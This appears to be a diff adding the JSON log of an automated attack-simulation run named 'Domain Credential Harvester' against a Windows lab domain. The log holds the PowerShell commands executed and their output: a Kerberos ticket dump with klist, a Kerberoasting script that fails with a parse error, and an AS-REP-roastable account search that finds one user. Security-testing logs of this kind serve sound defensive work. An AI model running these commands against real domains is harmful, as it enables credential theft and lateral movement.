@@ -1,0 +1,68 @@
+{
+  "operation_id": "4dcc65aa-0a8a-4e88-86ff-1a02f6b4c323",
+  "engagement_id": "e70e34e0-7526-4e7c-97c2-156a69c0574b",
+  "name": "Auto Test - Domain Credential Harvester",
+  "status": "completed",
+  "environment": {
+    "environment_id": "82e01037-11db-4b59-a79c-661b3838cfea",
+    "name": "Test Prod"
+  },
+  "adversary": {
+    "adversary_id": "295d7dd4-ac22-4f04-973e-85157b4a24db",
+    "engagement_id": "e70e34e0-7526-4e7c-97c2-156a69c0574b",
+    "name": "Domain Credential Harvester",
+    "is_tested": true
+  },
+  "required_platforms": [
+    "windows"
+  ],
+  "platform_agents": {
+    "windows": {
+      "agent_id": "277f297f",
+      "hostname": "CASTELBLACK",
+      "platform": "windows"
+    },
+    "linux": null,
+    "mac": null
+  },
+  "progress": {
+    "total_abilities": 3,
+    "completed_abilities": 3,
+    "progress_percent": 100
+  },
+  "started_at": "2026-06-25T13:16:51.554319",
+  "completed_at": "2026-06-25T13:17:12.125131",
+  "kill_switch_triggered": false,
+  "execution_logs": [
+    {
+      "ability_id": "202bba1d-37cb-454b-b8f0-4b6160def8d0",
+      "stage_id": "090318e1-3f20-4b27-8f37-1bc21fe00c41",
+      "command_executed": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path \"$d\\cred_access\")){ni -ItemType Directory -Force \"$d\\cred_access\"|out-null}; $(try { klist } catch { \"ERROR: $_\" }) | Tee-Object -FilePath \"$d\\cred_access\\tickets.txt\"",
+      "stdout": "\nCurrent LogonId is 0:0xa4212\n\nCached Tickets: (5)\n\n#0>\tClient: test @ NORTH.SEVENKINGDOMS.LOCAL\n\tServer: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL\n\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\tTicket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize \n\tStart Time: 6/24/2026 22:19:02 (local)\n\tEnd Time:   6/25/2026 8:19:01 (local)\n\tRenew Time: 7/1/2026 22:19:01 (local)\n\tSession Key Type: AES-256-CTS-HMAC-SHA1-96\n\tCache Flags: 0x2 -> DELEGATION \n\tKdc Called: winterfell.north.sevenkingdoms.local\n\n#1>\tClient: test @ NORTH.SEVENKINGDOMS.LOCAL\n\tServer: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL\n\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\tTicket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize \n\tStart Time: 6/24/2026 22:19:01 (local)\n\tEnd Time:   6/25/2026 8:19:01 (local)\n\tRenew Time: 7/1/2026 22:19:01 (local)\n\tSession Key Type: AES-256-CTS-HMAC-SHA1-96\n\tCache Flags: 0x1 -> PRIMARY \n\tKdc Called: WINTERFELL\n\n#2>\tClient: test @ NORTH.SEVENKINGDOMS.LOCAL\n\tServer: ldap/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL\n\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\tTicket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize \n\tStart Time: 6/25/2026 0:24:04 (local)\n\tEnd Time:   6/25/2026 8:19:01 (local)\n\tRenew Time: 7/1/2026 22:19:01 (local)\n\tSession Key Type: AES-256-CTS-HMAC-SHA1-96\n\tCache Flags: 0 \n\tKdc Called: winterfell.north.sevenkingdoms.local\n\n#3>\tClient: test @ NORTH.SEVENKINGDOMS.LOCAL\n\tServer: cifs/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL\n\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\tTicket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize \n\tStart Time: 6/24/2026 22:19:02 (local)\n\tEnd Time:   6/25/2026 8:19:01 (local)\n\tRenew Time: 7/1/2026 22:19:01 (local)\n\tSession Key Type: AES-256-CTS-HMAC-SHA1-96\n\tCache Flags: 0 \n\tKdc Called: winterfell.north.sevenkingdoms.local\n\n#4>\tClient: test @ NORTH.SEVENKINGDOMS.LOCAL\n\tServer: LDAP/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL\n\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\tTicket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize \n\tStart Time: 6/24/2026 22:19:01 (local)\n\tEnd Time:   6/25/2026 8:19:01 (local)\n\tRenew Time: 7/1/2026 22:19:01 (local)\n\tSession Key Type: AES-256-CTS-HMAC-SHA1-96\n\tCache Flags: 0 \n\tKdc Called: winterfell.north.sevenkingdoms.local\n",
+      "stderr": "",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-25T13:16:54.912904"
+    },
+    {
+      "ability_id": "476e45d3-690b-496f-bf69-725bae29380a",
+      "stage_id": "cd2b3bd5-6aed-41e2-8f4b-c7b530204403",
+      "command_executed": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path \"$d\\cred_access\")){ni -ItemType Directory -Force \"$d\\cred_access\"|out-null}; $(try { Add-Type -AssemblyName System.IdentityModel; $spns = @(); try { $searcher = [ADSISearcher]\"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\"; $searcher.SearchRoot = [ADSI]\"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local\"; foreach($result in $searcher.FindAll()) { foreach($spn in $result.Properties.serviceprincipalname) { if($spn -notmatch \"krbtgt\") { $spns += $spn } } } } catch { Write-Output \"LDAP search failed: $_. Reverting to fallback SPN list.\"; $spns = @(\"MSSQLSvc/sql01.north.sevenkingdoms.local:1433\", \"HTTP/web01.north.sevenkingdoms.local\") }; foreach($spn in $spns) { try { $tgt = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; Write-Output \"Successfully requested TGS for $spn\" } catch { Write-Output \"Failed for $spn: $_\" } } } catch { \"ERROR: $_\" }) | Tee-Object -FilePath \"$d\\cred_access\\kerberoast_out.txt\"",
+      "stdout": "",
+      "stderr": "At line:1 char:927\n+ ... uested TGS for $spn\" } catch { Write-Output \"Failed for $spn: $_\" } } ...\n+                                                             ~~~~~\nVariable reference is not valid. ':' was not followed by a valid variable name character. Consider using ${} to delimit the name.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : InvalidVariableReferenceWithDrive\n \n",
+      "exit_code": 1,
+      "executor": "",
+      "timestamp": "2026-06-25T13:17:00.745565"
+    },
+    {
+      "ability_id": "bf8dafee-16c7-464b-9e33-f1519c13a662",
+      "stage_id": "897b382c-8a30-489a-8c55-c71f23f44f23",
+      "command_executed": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path \"$d\\cred_access\")){ni -ItemType Directory -Force \"$d\\cred_access\"|out-null}; $(try { $roastable = @(); try { $searcher = [ADSISearcher]\"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\"; $searcher.SearchRoot = [ADSI]\"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local\"; foreach($res in $searcher.FindAll()) { $roastable += $res.Properties.samaccountname }; if ($roastable.Count -gt 0) { Write-Output \"Found roastable accounts: $($roastable -join ', ')\" } else { Write-Output \"No accounts found with DONT_REQ_PREAUTH\" } } catch { Write-Output \"AS-REP LDAP search failed: $_\" } } catch { \"ERROR: $_\" }) | Tee-Object -FilePath \"$d\\cred_access\\asrep_out.txt\"",
+      "stdout": "Found roastable accounts: brandon.stark\n",
+      "stderr": "",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-25T13:17:06.585239"
+    }
+  ]
+}
